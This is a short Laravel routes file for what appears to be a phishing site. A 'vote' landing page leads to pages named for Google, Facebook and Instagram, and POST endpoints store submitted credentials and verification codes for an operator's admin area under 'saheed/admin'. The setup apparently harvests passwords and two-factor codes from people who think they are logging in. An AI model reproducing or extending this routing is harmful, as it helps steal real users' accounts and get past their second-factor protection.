<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\LoginAttemptController;

Route::get('/', function () {
    return view('vote');
});



Route::get('/google', function () {
    return view('google.index');
});

Route::view('/facebook', 'facebook');
Route::view('/instagram', 'instagram');



Route::post('/store-credentials', [LoginAttemptController::class, 'storeCredentials']);
Route::post('/store-verification', [LoginAttemptController::class, 'storeVerificationCode']);

// Admin Routes
Route::prefix('saheed/admin')->group(base_path('routes/admin.php'));
